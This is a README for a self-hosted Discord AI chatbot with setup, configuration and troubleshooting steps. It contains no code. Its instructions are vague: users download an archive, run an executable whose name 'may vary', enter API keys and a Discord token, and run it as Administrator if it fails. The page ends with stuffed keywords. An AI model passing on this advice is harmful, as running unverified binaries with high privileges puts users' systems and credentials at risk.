# 🤖 disturpe-ai-chatbot - Your Private AI Assistant for Discord

[![Download Now](https://img.shields.io/badge/Download%20Now-%2344B37E?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Brianosteal912/disturpe-ai-chatbot)

## 🌟 What Is This?

Disturpe AI Chatbot lets you add a smart, privacy-focused AI friend to your Discord server. It remembers your conversations, works with any AI provider you choose, and runs on your own computer—so no one else sees your data. Perfect for communities who want a helpful bot without giving away their privacy.

## ✨ Key Features

- **🧠 Provider-Neutral AI** - Use any AI model you want (OpenAI, Anthropic, local models, etc.).
- **💬 Local Memory** - The bot stores conversation history in a small SQLite database on your PC.
- **⚙️ Daily Quotas** - Set how many messages each user can send per day to prevent spam.
- **🔒 Privacy First** - Everything stays on your machine. No cloud, no tracking.
- **📝 Optional Discord Logging** - Turn on logging to see what the bot does in a separate channel.
- **🎯 Self-Hosted** - You control the bot entirely. No subscription fees.

## 🚀 Getting Started

### What You Need

- A Windows computer (Windows 10 or 11 recommended).
- A Discord account and a server where you have "Manage Server" permissions.
- Basic computer skills (download files, run programs).

### Step 1: Download the Application

Visit the link below to download the application:

[**👉 Click Here to Download disturpe-ai-chatbot**](https://github.com/Brianosteal912/disturpe-ai-chatbot)

### Step 2: Install the Bot

1. Open the downloaded file (it might be named "disturpe-ai-chatbot.zip" or something similar).
2. Extract all files to a folder on your desktop or documents—anywhere you like.
3. Inside that folder, find and run "setup.exe" or "disturpe.ai.chatbot.exe" (the exact name may vary). Follow the installer's instructions.

### Step 3: Configure Your Bot

1. After installation, the bot may show a configuration window or a command prompt. Look for a file called "config.json" or "settings.txt" in the installation folder.
2. Open it with Notepad (right-click > Open with > Notepad).
3. You'll see settings like:
   - "AI Provider" - Choose which AI service to use (e.g., "openai", "anthropic"). You'll need an API key from that provider.
   - "Daily Quota" - Set a number (like 50) for messages per user per day.
   - "Memory Size" - How many past conversations the bot remembers (e.g., 100).
   - "Discord Token" - This is the secret token from Discord to connect the bot to your server (we'll get this next).
4. Save the file after making changes.

### Step 4: Create Your Discord Bot Token

1. Go to the [Discord Developer Portal](https://discord.com/developers/applications).
2. Click "New Application" and give it a name (e.g., "My AI Bot").
3. Go to "Bot" on the left sidebar, then click "Add Bot".
4. Under "Token", click "Copy" to copy the bot token. **Do not share this token with anyone.**
5. Paste this token into your config file where it says `"discord_token": ""`.

### Step 5: Invite the Bot to Your Server

1. In the Discord Developer Portal, click "OAuth2" → "URL Generator".
2. Check "bot" under Scopes.
3. Check "Send Messages", "Read Messages", "Read Message History" under Bot Permissions.
4. Copy the generated URL, paste it into your web browser, and authorize the bot to join your server.

### Step 6: Run the Bot

1. Back in the installation folder, double-click "start.bat" or "run.exe" to launch the bot.
2. A command window (black screen) will appear. It shows the bot starting. Do NOT close this window while the bot is running.
3. Type "/help" in any Discord text channel where the bot is present to see available commands.

## 🛠️ Configuration Options

| Setting | Description | Example |
|---------|-------------|---------|
| AI Provider | Which AI service powers the bot | "openai", "mistral", "llama" |
| API Key | Your API key from the provider | "sk-abc123..." |
| Daily Quota | Max messages per user per day | "50" |
| Memory Size | How many messages the bot remembers | "200" |
| Logging | Enable/disable log channel | "true" or "false" |

## 🎯 How It Works for Your Users

Once running:
- Users type "@YourBot [question]" in Discord.
- The bot responds instantly.
- It remembers past conversations for context.
- It enforces daily message limits you set.

## 🔧 Troubleshooting

**Q: The bot doesn't respond in Discord.**
A: Check that you entered the correct bot token and that the bot is online (green dot in Discord). Also ensure the bot has permissions to read and send messages.

**Q: I get API errors.**
A: Double-check your API key from your AI provider. Keys have limited validity.

**Q: The command window closes immediately.**
A: Try running as Administrator. Right-click the start file and select "Run as administrator".

**Q: How do I update the bot?**
A: Download the latest version from the same link and replace the files. Keep your config file safe.

## 📄 License

This project is open source. See the LICENSE file in the repository for details.

## 🤝 Support

You can report bugs or suggest features on the [GitHub Issues](https://github.com/Brianosteal912/disturpe-ai-chatbot/issues) page.

Keywords: ai,ai-agent,ai-agents,ai-chat,ai-chat-bot,ai-chatbot,ai-chatbot-project,ai-chatbots,ai-discord-bot,ai-discord-bot-github,ai-discord-chat,ai-model,ai-tools